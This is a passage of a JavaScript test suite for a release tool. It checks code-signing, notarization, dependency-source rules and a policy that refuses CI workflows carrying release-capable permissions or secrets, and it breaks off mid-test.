import "./test-support/broker-guard.mjs";
import { tempRoot } from "./test-support/temp-roots.mjs";
import assert from "node:assert/strict";
import { existsSync, mkdirSync, readFileSync, unlinkSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { spawnSync } from "./background-process.mjs";
import { brokerManagedHost } from "./cargo-contract.mjs";
import { signingReceiptPath } from "./signing-receipts.mjs";
import { swiftPrivatePackagesCleanupStep, swiftPrivatePackagesConfigureStep, validateManifest } from "../ci/manifest.mjs";
import { renderLanes } from "../ci/sync.mjs";
import test from "node:test";
import { admittedWorkerEnv } from "./test-support/admission.mjs";
import { editConfig, fixture, git, hostPlatform, lastPlatform, managedEnv, pnpmLockFor, release, runDoctor, runDoctorWith, versions, withQaAdoption } from "./test-support/fixture.mjs";
import { evaluatePrebuildGates } from "./prebuild-gates.mjs";

function addFrontendDist(config, files, targetExtra) {
  const dir = path.dirname(config);
  const dist = path.join(dir, "dist");
  mkdirSync(path.join(dist, "assets"), { recursive: true });
  for (const [name, text] of Object.entries(files)) writeFileSync(path.join(dist, name), text, "utf8");
  mkdirSync(path.join(dir, "src-tauri"), { recursive: true });
  writeFileSync(path.join(dir, "src-tauri", "tauri.conf.json"), JSON.stringify({ build: { frontendDist: "../dist" } }), "utf8");
  git(dir, "add", ".");
  git(dir, "commit", "-m", "frontend dist");
  return config;
}

test("release fails closed when the frontend dist carries a browser-QA mock marker", () => {
  const config = addFrontendDist(fixture({ platform: "win" }), { "index.html": "<html></html>", "assets/app.js": "const x=window.__tauriQaMock;" });
  const result = run(config);
  assert.notEqual(result.status, 0, `${result.stdout}\n${result.stderr}`);
  assert.match(`${result.stdout}\n${result.stderr}`, /pre-package frontend bundle: a release web bundle must not contain browser-QA mocks/);
  assert.match(`${result.stdout}\n${result.stderr}`, /tauriQaMock/);
});

test("release accepts a clean frontend dist and logs the web scan", () => {
  const config = addFrontendDist(fixture({ platform: "win" }), { "index.html": "<html></html>", "assets/app.js": "console.log(1)" });
  const result = run(config);
  assert.doesNotMatch(`${result.stdout}\n${result.stderr}`, /browser-QA mocks/);
  assert.match(result.stdout, /pre-package frontend bundle: 2 web file\(s\) scanned/);
});

function lockFixture() {
  const dir = tempRoot("right-release-lock-test-");
  const config = path.join(dir, "right-release.config.mjs");
  const lockPackage = withQaAdoption({
        name: "fixture-lock",
        scripts: { "release:patch:mac": "right-release --platform mac --tier patch" },
        packageManager: versions.packageManager,
        dependencies: {
          "@rightkit/license": versions.npm["@rightkit/license"],
          "@rightkit/logs": versions.npm["@rightkit/logs"],
        },
        devDependencies: { "@rightkit/release": versions.npm["@rightkit/release"] },
      });
  writeFileSync(path.join(dir, "package.json"), JSON.stringify(lockPackage, null, 2));
  writeFileSync(path.join(dir, "pnpm-lock.yaml"), pnpmLockFor(lockPackage), "utf8");
  writeFileSync(
    config,
    `export default ${JSON.stringify({
      schema: 1,
      app: "fixture-lock",
      packageManager: "pnpm",
      checks: [],
      targets: {
        mac: {
          signed: true,
          signingContract: "macos-developer-id-notarized-portable-v1",
          prePackage: { cmd: "node", args: ["-e", "process.exit(0)"] },
          sign: { prePackageFiles: ["fixture"] },
          notarize: { file: "fixture.zip" },
          package: { cmd: "node", args: ["-e", "process.exit(0)"] },
          artifacts: [],
          hardening: [],
          installer: { artifacts: [] },
          updater: { artifacts: [] },
        },
      },
    })};\n`,
  );
  return { dir, config };
}

function run(config, ...args) {
  const argv = [release, "--config", config, "--platform", "win", "--dry-run", ...args];
  return spawnSync(process.execPath, argv, {
    encoding: "utf8",
    env: managedEnv(config, { worker: true, platform: lastPlatform(argv, "win") }),
  });
}

function runRaw(config, ...args) {
  return spawnSync(process.execPath, [release, "--config", config, ...args], {
    encoding: "utf8",
    env: managedEnv(config, { worker: !args.includes("--doctor"), platform: lastPlatform(args, hostPlatform) }),
  });
}

// Fixture repos have no enrolled protected trust (and no origin), so ownership must fail
// closed; every other doctor check must still pass.
function assertDoctorFailsClosedOnlyOnOwnership(result) {
  const output = `${result.stdout}\n${result.stderr}`;
  const otherFailures = output.split(/\r?\n/).filter((line) => /^\s*\[(?:FAIL|ERROR)\] /.test(line) && !/^\s*\[FAIL\] ownership: /.test(line));
  assert.deepEqual(otherFailures, [], output);
  // The config findings are not [FAIL] rows: the doctor prints each as a "right-release: <text>" line on stderr, so a finding that is
  // not the ownership one is read there. What stderr may carry besides is the summary and the lines that are not findings.
  const stderrFindings = result.stderr.split(/\r?\n/).filter((line) => /^right-release: /.test(line) && !/^right-release: (?:preflight found \d+ blocking problem\(s\); the build would fail on these$|NOT RUN |WARNING |note )/.test(line));
  assert.deepEqual(stderrFindings, [], output);
  // And the doctor's own count of blocking problems is the ownership rows and nothing else.
  const ownershipFailures = (result.stdout.match(/^\s*\[FAIL\] ownership: /gm) ?? []).length;
  assert.equal(Number(/^right-release: preflight found (\d+) blocking problem\(s\)/m.exec(result.stderr)?.[1] ?? 0), ownershipFailures, output);
  // Without a protected ownership enrollment on this host (a clean CI runner), ownership is an advisory WARN that does
  // not block, so the doctor exits 0. An enrolled host reports the blocking ownership FAIL and a non-zero exit instead.
  if (/^\s*\[WARN\] ownership: WARNING: ownership approval enrollment is pending/m.test(output)) {
    assert.equal(result.status, 0, output);
    return;
  }
  assert.notEqual(result.status, 0, output);
  assert.match(output, /^\s*\[FAIL\] ownership: /m);
}

test("accepts a tier-neutral internal build", () => {
  const result = run(fixture());
  assert.equal(result.status, 0, result.stderr);
  assert.match(result.stdout, /tier=neutral/);
  assert.doesNotMatch(result.stdout, /RIGHT_RELEASE_TIER=/);
});

test("notarization commands default to a bounded 30-minute timeout without changing explicit overrides", () => {
  const defaultResult = runRaw(fixture({
    platform: "mac",
    macSigning: true,
    packageCommand: { cmd: "node", args: ["-e", "process.exit(0)", "--notarize"] },
  }), "--platform", "mac", "--dry-run");
  assert.equal(defaultResult.status, 0, defaultResult.stderr);
  assert.match(defaultResult.stdout, /timeout=1800000ms/);

  const explicitResult = runRaw(fixture({
    platform: "mac",
    macSigning: true,
    packageCommand: { cmd: "node", args: ["-e", "process.exit(0)", "--notarize"], timeoutMs: 1234 },
  }), "--platform", "mac", "--dry-run");
  assert.equal(explicitResult.status, 0, explicitResult.stderr);
  assert.match(explicitResult.stdout, /timeout=1234ms/);
});

test("release worker reuses owned process-tree termination for Windows and remote command descendants", () => {
  const source = readFileSync(release, "utf8");
  assert.match(source, /import \{ terminateProcessTree \} from "\.\/heavy-command\.mjs"/);
  assert.match(source, /function killProcessTree\(pid\) \{\s*terminateProcessTree\(pid\);\s*\}/s);
});

test("Windows native release tools preserve artifact arguments containing spaces", () => {
  const source = readFileSync(release, "utf8");
  assert.match(source, /const useShell = process\.platform === "win32" && !\/\\\.\(\?:exe\|com\)\$\/i\.test\(cmd\);/);
  assert.match(source, /shell: useShell/);
  assert.doesNotMatch(source, /shell: process\.platform === "win32"/);
});

test("accepts patch and exposes it to the signed package command", () => {
  const result = run(fixture(), "--tier=patch");
  assert.equal(result.status, 0, result.stderr);
  assert.match(result.stdout, /tier=patch/);
  assert.match(result.stdout, /RIGHT_RELEASE_TIER=patch/);
});

test("accepts update as the Pro-gated feature tier", () => {
  const result = run(fixture(), "--tier", "update");
  assert.equal(result.status, 0, result.stderr);
  assert.match(result.stdout, /tier=update/);
  assert.match(result.stdout, /RIGHT_RELEASE_TIER=update/);
});

test("rejects an invalid entitlement tier", () => {
  const result = run(fixture(), "--tier=minor");
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /invalid --tier.*patch\|update/i);
});

test("rejects targets that do not explicitly declare signed release output", () => {
  const result = run(fixture({ signed: false }), "--tier=patch");
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /signed: true/);
});

test("rejects Windows targets with missing or ambiguous signing configuration", () => {
  for (const options of [{ signingContract: null }, { prePackageFiles: [] }, { prePackageFiles: ["raw.exe", "other.exe"] }]) {
    const result = run(fixture(options), "--tier=patch");
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /signingContract|prePackageFiles/i);
  }
});

test("accepts portable Windows releases with multiple pre-package executables and no installer", () => {
  const result = run(fixture({
    signingContract: "windows-raw-exe-authenticode-before-portable-v1",
    prePackageFiles: ["legion.exe", "legion-hook.exe", "legion-mcp.exe"],
    signFiles: [],
  }), "--tier=patch");
  assert.equal(result.status, 0, result.stderr);
  assert.match(result.stdout, /raw-exe/);
  assert.doesNotMatch(result.stdout, /bundle marker/);
});

test("macOS notarize.staple: false is accepted for a bare-executable archive and refused with notarize.app or a DMG", () => {
  const okResult = runRaw(fixture({ platform: "mac", macSigning: true, macNotarize: { file: "fixture.zip", staple: false } }), "--platform", "mac", "--dry-run");
  assert.equal(okResult.status, 0, okResult.stderr);
  const withApp = runRaw(fixture({ platform: "mac", macSigning: true, macNotarize: { file: "fixture.zip", staple: false, app: "dist/App.app" } }), "--platform", "mac", "--dry-run");
  assert.notEqual(withApp.status, 0);
  assert.match(withApp.stderr, /notarize\.staple: false applies only/);
  const dmg = runRaw(fixture({ platform: "mac", macSigning: true, macNotarize: { file: "fixture.dmg", staple: false } }), "--platform", "mac", "--dry-run");
  assert.notEqual(dmg.status, 0);
  assert.match(dmg.stderr, /notarize\.staple: false applies only/);
});

test("macOS portable contract signs exact pre-package files then notarizes declared archive", () => {
  const result = run(fixture({ platform: "mac", macSigning: true }), "--platform", "mac", "--tier=patch", "--dry-run");
  assert.equal(result.status, 0, result.stderr);
  const prepareAt = result.stdout.indexOf("node -e process.exit(0)");
  const signingAt = result.stdout.indexOf("signing macOS Developer ID files");
  const packageAt = result.stdout.indexOf("node -e process.exit(0)", prepareAt + 1);
  const notarizeAt = result.stdout.indexOf("notarizing macOS archive");
  assert.ok(prepareAt >= 0 && signingAt > prepareAt && packageAt > signingAt && notarizeAt > packageAt, result.stdout);
  assert.match(result.stdout, /sign-macos\.mjs/);
  assert.match(result.stdout, /notarize-macos\.mjs/);
});

function swiftMacFixture(targetExtra) {
  const config = fixture({ platform: "mac", macSigning: true });
  const dir = path.dirname(config);
  writeFileSync(path.join(dir, "Package.swift"), "// swift-tools-version:5.9\n");
  const body = readFileSync(config, "utf8");
  const parsed = JSON.parse(body.slice("export default ".length, body.lastIndexOf(";")));
  const mac = parsed.targets.mac;
  parsed.targets.mac = { ...mac, projectType: "swiftpm", package: undefined, notarize: { app: "dist/App.app", file: "dist/App.dmg", appBeforePackage: true }, ...targetExtra };
  writeFileSync(config, `export default ${JSON.stringify(parsed)};\n`);
  git(dir, "add", ".");
  git(dir, "commit", "-m", "swift");
  return config;
}

test("swiftpm mac with appBeforePackage dry-run builds the DMG after app notarization and before DMG notarization", () => {
  const result = run(swiftMacFixture({}), "--platform", "mac", "--dry-run");
  assert.equal(result.status, 0, result.stderr + result.stdout);
  const appAt = result.stdout.indexOf("notarize app");
  const dmgAt = result.stdout.indexOf("build DMG");
  const archiveAt = result.stdout.indexOf("notarizing macOS archive");
  assert.ok(appAt >= 0 && dmgAt > appAt && archiveAt > dmgAt, result.stdout);
});

test("swiftpm mac preflight rejects a prePackage that builds the DMG with appBeforePackage on", () => {
  const result = run(swiftMacFixture({ prePackage: { cmd: "node", args: ["make-dmg.mjs"] } }), "--platform", "mac", "--dry-run");
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /prePackage builds a DMG/);
});

// Rewrite the fixture's mac target (sign matrix, dmg spec, ...) and files, then commit like swiftMacFixture.
function macMatrixFixture({ sign, target = {}, files = {} }) {
  const config = fixture({ platform: "mac", macSigning: true });
  const dir = path.dirname(config);
  const body = readFileSync(config, "utf8");
  const parsed = JSON.parse(body.slice("export default ".length, body.lastIndexOf(";")));
  parsed.targets.mac = { ...parsed.targets.mac, ...(sign ? { sign } : {}), ...target };
  writeFileSync(config, `export default ${JSON.stringify(parsed)};\n`);
  for (const [name, text] of Object.entries(files)) { mkdirSync(path.dirname(path.join(dir, name)), { recursive: true }); writeFileSync(path.join(dir, name), text); }
  git(dir, "add", ".");
  git(dir, "commit", "-m", "mac matrix");
  return config;
}
const ENTITLEMENTS_PLIST = '<?xml version="1.0" encoding="UTF-8"?>\n<plist version="1.0"><dict/></plist>\n';

test("macOS signing matrix: object entries and nestedCode pass validation and reach the dry-run signing step", () => {
  const config = macMatrixFixture({
    sign: { prePackageFiles: [{ file: "dist/Fixture.app", entitlements: "release/app.plist", hardenedRuntime: true }, "dist/tool"],
      nestedCode: { "Contents/Helpers/helper": { hardenedRuntime: true }, "Contents/PlugIns/Ext.appex": { entitlements: "release/ext.plist" } } },
    files: { "release/app.plist": ENTITLEMENTS_PLIST, "release/ext.plist": ENTITLEMENTS_PLIST },
  });
  const result = runRaw(config, "--platform", "mac", "--tier=patch", "--dry-run");
  assert.equal(result.status, 0, result.stderr);
  assert.match(result.stdout, /dry-run: per-file signing matrix \(2 nestedCode rule\(s\), 1 entry setting\(s\)\)/);
  assert.match(result.stdout, /dry-run: Developer ID signing|sign-macos\.mjs/);
});

test("macOS signing matrix: a missing entitlements file or malformed matrix fails release validation naming the field", () => {
  const missing = runRaw(macMatrixFixture({ sign: { prePackageFiles: [{ file: "dist/Fixture.app", entitlements: "release/missing.plist" }] } }), "--platform", "mac", "--dry-run");
  assert.notEqual(missing.status, 0);
  assert.match(missing.stderr, /sign\.prePackageFiles\[0\]\.entitlements file not found: release\/missing\.plist/);
  const malformed = runRaw(macMatrixFixture({ sign: { prePackageFiles: ["dist/tool"], nestedCode: { "Contents/Helpers/h": { hardenedRuntime: false } } } }), "--platform", "mac", "--dry-run");
  assert.notEqual(malformed.status, 0);
  assert.match(malformed.stderr, /exactly one \.app entry[\s\S]*hardenedRuntime: false is not allowed|hardenedRuntime: false is not allowed[\s\S]*exactly one \.app entry/);
});

test("macOS signing matrix: doctor validates the matrix too", () => {
  const result = runDoctor(macMatrixFixture({ sign: { prePackageFiles: [{ file: "dist/Fixture.app", entitlements: "release/missing.plist" }] } }));
  assert.notEqual(result.status, 0);
  if (hostPlatform === "mac") assert.match(`${result.stdout}${result.stderr}`, /entitlements file not found: release\/missing\.plist/);
});

test("targets.mac.dmg.spec is validated at release time", () => {
  const spec = (value) => macMatrixFixture({ target: { dmg: { spec: "release/appdmg.json" } }, files: { "release/appdmg.json": JSON.stringify(value) } });
  const ok = runRaw(spec({ title: "Fixture", contents: [{ x: 1, y: 2, type: "link", path: "/Applications" }] }), "--platform", "mac", "--dry-run");
  assert.equal(ok.status, 0, ok.stderr);
  const bad = runRaw(spec({ title: "Fixture", "code-sign": {} }), "--platform", "mac", "--dry-run");
  assert.notEqual(bad.status, 0);
  assert.match(bad.stderr, /targets\.mac\.dmg\.spec: DMG spec: code-sign is not supported/);
});

test("Windows targets reject object sign entries and nestedCode (macOS-only)", () => {
  const config = fixture();
  const body = readFileSync(config, "utf8");
  const parsed = JSON.parse(body.slice("export default ".length, body.lastIndexOf(";")));
  parsed.targets.win.sign.prePackageFiles = [{ file: "raw.exe", entitlements: "x.plist" }];
  writeFileSync(config, `export default ${JSON.stringify(parsed)};\n`);
  const result = run(config, "--tier=patch");
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /object entries and sign\.nestedCode are macOS-only/);
});

test("macOS portable contract rejects missing signing or notarization declarations", () => {
  const result = run(fixture({ platform: "mac" }), "--platform", "mac", "--tier=patch", "--dry-run");
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /mac must declare signingContract/i);
});

test("uses a configured signing receipt path for portable architecture isolation", () => {
  const source = readFileSync(release, "utf8");
  assert.match(source, /signingReceiptPath\(\{ appRoot: root, target, platform: "win", phase, stateRoot: process\.env\.RIGHT_RELEASE_STATE_ROOT \}\)/);
  const appRoot = path.resolve("fixture");
  const target = { sign: { receipt: "receipts/raw-x64.json", installerReceipt: "receipts/installer-x64.json" } };
  assert.equal(signingReceiptPath({ appRoot, target, platform: "win", phase: "raw-exe" }), path.join(appRoot, "receipts/raw-x64.json"));
  assert.equal(signingReceiptPath({ appRoot, target, platform: "win", phase: "installer" }), path.join(appRoot, "receipts/installer-x64.json"));
});

test("rejects portable Windows releases that declare a second installer signing phase", () => {
  const result = run(fixture({
    signingContract: "windows-raw-exe-authenticode-before-portable-v1",
    prePackageFiles: ["legion.exe"],
  }), "--tier=patch");
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /portable.*omit sign\.files/i);
});

test("rejects Git, path, or link RightKit app dependencies before release work starts", () => {
  const result = run(
    fixture({
      packageJson: {
        name: "fixture",
        packageManager: versions.packageManager,
        scripts: { "release:patch:win": "node ../tools/right-release/release.mjs --tier patch" },
        dependencies: {
          "@rightkit/license": "git+https://github.com/adrdsouza/rightkit.git#main",
          "@rightkit/logs": "link:../../../rightkit/packages/logs",
        },
        devDependencies: {
          "@rightkit/release": "github:adrdsouza/claude#main&path:/tools/right-release",
        },
      },
    }),
    "--tier=patch",
  );
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /right-release bin|published npm package/i);
});

test("accepts the installed @rightkit/git 0.2.15 release-chain consumer", () => {
  const result = run(fixture({
    packageJson: {
      name: "fixture",
      packageManager: versions.packageManager,
      scripts: { "release:patch:win": "right-release --platform win --tier patch" },
      dependencies: { "@rightkit/git": "0.2.15" },
      devDependencies: { "@rightkit/release": versions.stagedNpm["@rightkit/release"] },
    },
  }));
  assert.equal(result.status, 0, result.stderr);
});

test("accepts the current @rightkit/git 0.2.21 release-chain consumer", () => {
  const result = run(fixture({
    packageJson: {
      name: "fixture",
      packageManager: versions.packageManager,
      scripts: { "release:patch:win": "right-release --platform win --tier patch" },
      dependencies: { "@rightkit/git": "0.2.21" },
      devDependencies: { "@rightkit/release": versions.stagedNpm["@rightkit/release"] },
    },
  }));
  assert.equal(result.status, 0, result.stderr);
});

test("rejects an unlisted future @rightkit/git release-chain consumer", () => {
  // One patch past the staged version, so the test never goes stale when git publishes.
  const [major, minor, patch] = versions.registry.npm["@rightkit/git"].split(".").map(Number);
  const future = `${major}.${minor}.${patch + 1}`;
  // A version above the bundled file is no longer refused for being unlisted: it is refused when the registry does not
  // publish it (staged but unpublished), and accepted when the registry proves it (the doctor resolves it live).
  const config = fixture({
    packageJson: {
      name: "fixture",
      packageManager: versions.packageManager,
      scripts: { "release:patch:win": "right-release --platform win --tier patch" },
      dependencies: { "@rightkit/git": future },
      devDependencies: { "@rightkit/release": versions.stagedNpm["@rightkit/release"] },
    },
  });
  const result = runDoctorWith(config, { RK_TEST_UNPUBLISHED: `@rightkit/git@${future}` });
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, new RegExp(`@rightkit/git ${future.replaceAll(".", "\\.")} is not published on npm`, "i"));
});

test("accepts an unlisted @rightkit/git patch inside the recorded range, rejects one below the minimum", () => {
  const recorded = new Set([versions.npm["@rightkit/git"], versions.registry.npm["@rightkit/git"], ...(versions.legacyNpm["@rightkit/git"] ?? []), versions.registry?.npm?.["@rightkit/git"]].filter(Boolean));
  const triples = [...recorded].map((v) => v.split(".").map(Number)).sort((a, b) => a[0] - b[0] || a[1] - b[1] || a[2] - b[2]);
  const [lo, hi] = [triples[0], triples.at(-1)];
  // An unlisted version strictly between the lowest and highest recorded version.
  let gap = null;
  for (let patch = lo[2] + 1; patch < hi[2] && !gap; patch += 1) if (!recorded.has(`${lo[0]}.${lo[1]}.${patch}`)) gap = `${lo[0]}.${lo[1]}.${patch}`;
  assert.ok(gap, "the versions file records a gap for @rightkit/git; update this test if it ever becomes contiguous");
  const pkg = (version) => ({ packageJson: { name: "fixture", packageManager: versions.packageManager,
    scripts: { "release:patch:win": "right-release --platform win --tier patch" },
    dependencies: { "@rightkit/git": version }, devDependencies: { "@rightkit/release": versions.stagedNpm["@rightkit/release"] } } });
  const accepted = run(fixture(pkg(gap)));
  assert.equal(accepted.status, 0, accepted.stderr);
  const below = run(fixture(pkg("0.0.1")));
  assert.notEqual(below.status, 0);
  assert.match(below.stderr, /@rightkit\/git 0\.0\.1 is below the recorded minimum/);
});

test("rejects hosted workflow files before release work starts", () => {
  const config = fixture();
  const workflowDir = path.join(path.dirname(config), ".github", "workflows");
  mkdirSync(workflowDir, { recursive: true });
  writeFileSync(path.join(workflowDir, "ci.yml"), "name: forbidden\n");

  const result = run(config, "--tier=patch");
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /hosted workflow.*forbidden/i);
});

test("declared-unrelated hosted workflows: admitted when declared and secretless, refused when one can sign", () => {
  const files = { "ci.yml": "web and server pipeline, unrelated to the released app" };
  const config = fixture({ hostedWorkflows: { policy: "declared-unrelated", files }, includeCargoSources: false });
  const root = path.dirname(config);
  const workflowDir = path.join(root, ".github", "workflows");
  mkdirSync(workflowDir, { recursive: true });
  writeFileSync(path.join(workflowDir, "ci.yml"), "name: web\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: pnpm test\n");
  git(root, "add", ".");
  git(root, "commit", "-m", "add web ci");
  const admitted = run(config, "--tier=patch");
  assert.equal(admitted.status, 0, admitted.stderr);

  writeFileSync(path.join(workflowDir, "ci.yml"), "name: web\njobs:\n  sign:\n    runs-on: macos-15\n    steps:\n      - run: codesign -s \"${{ secrets.MAC_CERT }}\" App.app\n");
  git(root, "add", ".");
  git(root, "commit", "-m", "sign in ci");
  const refused = run(config, "--tier=patch");
  assert.notEqual(refused.status, 0);
  assert.match(refused.stderr, /declared-unrelated hosted workflows refused: ci\.yml references secrets other than GITHUB_TOKEN/);
});

test("accepts one right-git managed CI workflow without granting hosted release authority", () => {
  const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
  const root = path.dirname(config);
  const workflowDir = path.join(root, ".github", "workflows");
  mkdirSync(workflowDir, { recursive: true });
  writeFileSync(path.join(root, ".rightgit.json"), JSON.stringify({ schemaVersion: 1, compile: "github-actions-only", lanes: ["ci"] }));
  writeFileSync(path.join(workflowDir, "ci.yml"), "# Managed by right-git — do not hand-edit.\npermissions:\n  contents: read\njobs: {}\n");
  git(root, "add", ".");
  git(root, "commit", "-m", "add managed ci");

  const result = run(config, "--tier=patch");
  assert.equal(result.status, 0, result.stderr);
});

test("accepts right-git managed CI and unsigned release-candidate workflows", () => {
  const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
  const root = path.dirname(config);
  const workflowDir = path.join(root, ".github", "workflows");
  mkdirSync(workflowDir, { recursive: true });
  writeFileSync(path.join(root, ".rightgit.json"), JSON.stringify({ schemaVersion: 1, compile: "github-actions-only", lanes: ["ci", "release-candidate"] }));
  const managedReadOnly = "# Managed by right-git — do not hand-edit.\npermissions:\n  contents: read\njobs: {}\n";
  writeFileSync(path.join(workflowDir, "ci.yml"), managedReadOnly);
  writeFileSync(path.join(workflowDir, "release-candidate.yml"), managedReadOnly);
  git(root, "add", ".");
  git(root, "commit", "-m", "add managed candidate workflows");

  const result = run(config, "--tier=patch");
  assert.equal(result.status, 0, result.stderr);
});

function declaredWorkflowFixture(workflows) {
  const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
  const root = path.dirname(config);
  const workflowDir = path.join(root, ".github", "workflows");
  mkdirSync(workflowDir, { recursive: true });
  const manifest = { schemaVersion: 1, compile: "github-actions-only", lanes: ["ci"], matrix: { os: ["ubuntu-latest"], node: ["22.13"] }, packageManager: "pnpm@11.25.0", templateVersion: "1.0.0", workflows };
  writeFileSync(path.join(root, ".rightgit.json"), JSON.stringify(manifest));
  return { config, root, workflowDir, manifest };
}

const DECLARED_WORKFLOWS = {
  "swift-host": { kind: "swift-host", file: "swift-host-tests.yml", os: ["macos-15"], packages: ["packages/SwiftCore"] },
  build: { kind: "custom", file: "build-windows.yml", on: { push: { branches: ["main"] }, workflow_dispatch: true }, runsOn: "windows-2025", steps: [{ name: "Build", shell: "pwsh", run: "echo build" }] },
};

test("accepts workflow files declared under the .rightgit.json workflows block only when they equal the canonical render", () => {
  const { config, root, workflowDir, manifest } = declaredWorkflowFixture(DECLARED_WORKFLOWS);
  assert.deepEqual(validateManifest(manifest).errors, []);
  for (const { filename, content } of renderLanes(manifest, root)) writeFileSync(path.join(workflowDir, filename), content);
  git(root, "add", ".");
  git(root, "commit", "-m", "add declared workflows");
  const accepted = run(config, "--tier=patch");
  assert.equal(accepted.status, 0, accepted.stderr);

  writeFileSync(path.join(workflowDir, "undeclared.yml"), "# Managed by right-git\npermissions:\n  contents: read\njobs: {}\n");
  git(root, "add", ".");
  git(root, "commit", "-m", "add undeclared workflow");
  const refused = run(config, "--tier=patch");
  assert.notEqual(refused.status, 0);
  assert.match(refused.stderr, /declared by \.rightgit\.json/);
});

test("refuses a null or malformed workflows entry and any declared file that is not the canonical render", () => {
  const stub = "# Managed by right-git\npermissions:\n  contents: write\njobs: {}\n";
  const nulled = declaredWorkflowFixture({ extra: null });
  for (const file of ["ci.yml", "extra.yml"]) writeFileSync(path.join(nulled.workflowDir, file), stub);
  git(nulled.root, "add", ".");
  git(nulled.root, "commit", "-m", "null entry");
  const nullResult = run(nulled.config, "--tier=patch");
  assert.notEqual(nullResult.status, 0);
  assert.match(nullResult.stderr, /workflows\.extra to be an object/);

  const malformed = declaredWorkflowFixture({ extra: { kind: "nonsense" } });
  for (const file of ["ci.yml", "extra.yml"]) writeFileSync(path.join(malformed.workflowDir, file), stub);
  git(malformed.root, "add", ".");
  git(malformed.root, "commit", "-m", "malformed entry");
  const malformedResult = run(malformed.config, "--tier=patch");
  assert.notEqual(malformedResult.status, 0);
  assert.match(malformedResult.stderr, /workflows block/);

  const stubbed = declaredWorkflowFixture(DECLARED_WORKFLOWS);
  for (const { filename, content } of renderLanes(stubbed.manifest, stubbed.root)) writeFileSync(path.join(stubbed.workflowDir, filename), filename === "swift-host-tests.yml" ? stub : content);
  git(stubbed.root, "add", ".");
  git(stubbed.root, "commit", "-m", "stub declared workflow");
  const stubResult = run(stubbed.config, "--tier=patch");
  assert.notEqual(stubResult.status, 0);
  assert.match(stubResult.stderr, /not byte-for-byte the @rightkit\/ci render|violates the declared-workflow policy/);
});

test("rejects workflows that do not exactly match right-git manifest lanes", () => {
  const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
  const root = path.dirname(config);
  const workflowDir = path.join(root, ".github", "workflows");
  mkdirSync(workflowDir, { recursive: true });
  writeFileSync(path.join(root, ".rightgit.json"), JSON.stringify({ schemaVersion: 1, compile: "github-actions-only", lanes: ["ci", "release-candidate"] }));
  writeFileSync(path.join(workflowDir, "ci.yml"), "# Managed by right-git\npermissions:\n  contents: read\njobs: {}\n");
  git(root, "add", ".");
  git(root, "commit", "-m", "omit declared candidate workflow");

  const result = run(config, "--tier=patch");
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /requires workflows declared by \.rightgit\.json/i);
});

test("rejects a self-labeled right-git workflow with release-capable authority", () => {
  const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
  const root = path.dirname(config);
  const workflowDir = path.join(root, ".github", "workflows");
  mkdirSync(workflowDir, { recursive: true });
  writeFileSync(path.join(root, ".rightgit.json"), JSON.stringify({ schemaVersion: 1, compile: "github-actions-only", lanes: ["ci"] }));
  writeFileSync(path.join(workflowDir, "ci.yml"), "# Managed by right-git\npermissions:\n  id-token: write\njobs: {}\n");
  git(root, "add", ".");
  git(root, "commit", "-m", "add unsafe ci");

  const result = run(config, "--tier=patch");
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /release-capable permissions or secrets/i);
});

test("rejects managed candidate workflows with write-all or indexed secrets", () => {
  for (const unsafe of ["permissions: write-all\n", "env:\n  TOKEN: ${{ secrets[\"TOKEN\"] }}\n"]) {
    const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
    const root = path.dirname(config);
    const workflowDir = path.join(root, ".github", "workflows");
    mkdirSync(workflowDir, { recursive: true });
    writeFileSync(path.join(root, ".rightgit.json"), JSON.stringify({ schemaVersion: 1, compile: "github-actions-only", lanes: ["ci", "release-candidate"] }));
    const managedReadOnly = "# Managed by right-git\npermissions:\n  contents: read\njobs: {}\n";
    writeFileSync(path.join(workflowDir, "ci.yml"), managedReadOnly);
    writeFileSync(path.join(workflowDir, "release-candidate.yml"), `# Managed by right-git\n${unsafe}jobs: {}\n`);
    git(root, "add", ".");
    git(root, "commit", "-m", "add unsafe candidate workflow");

    const result = run(config, "--tier=patch");
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /release-capable permissions or secrets/i);
  }
});

test("permits only declared Apple signing secrets in an explicit signed qualification lane", () => {
  const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
  const root = path.dirname(config);
  const workflowDir = path.join(root, ".github", "workflows");
  mkdirSync(workflowDir, { recursive: true });
  writeFileSync(path.join(root, ".rightgit.json"), JSON.stringify({ schemaVersion: 1, compile: "github-actions-only", lanes: ["ci", "release-candidate"], candidate: { signMacos: true } }));
  writeFileSync(path.join(workflowDir, "ci.yml"), "# Managed by right-git\npermissions:\n  contents: read\njobs: {}\n");
  writeFileSync(path.join(workflowDir, "release-candidate.yml"), "# Managed by right-git\npermissions:\n  contents: read\njobs:\n  macos-sign:\n    needs: [candidate]\n    if: ${{ startsWith(github.ref, 'refs/tags/v') || (github.event_name == 'workflow_dispatch' && inputs.signed_qualification == true) }}\n    env:\n      CERT: ${{ secrets.APPLE_CERTIFICATE_BASE64 }}\n      PASS: ${{ secrets.APPLE_CERTIFICATE_PASSWORD }}\n      KEYCHAIN: ${{ secrets.APPLE_KEYCHAIN_PASSWORD }}\n      KEY: ${{ secrets.APPLE_API_KEY_BASE64 }}\n      KEY_ID: ${{ secrets.APPLE_API_KEY }}\n      ISSUER: ${{ secrets.APPLE_API_ISSUER }}\n");
  git(root, "add", ".");
  git(root, "commit", "-m", "add signed mac candidate workflow");
  const result = run(config, "--tier=patch");
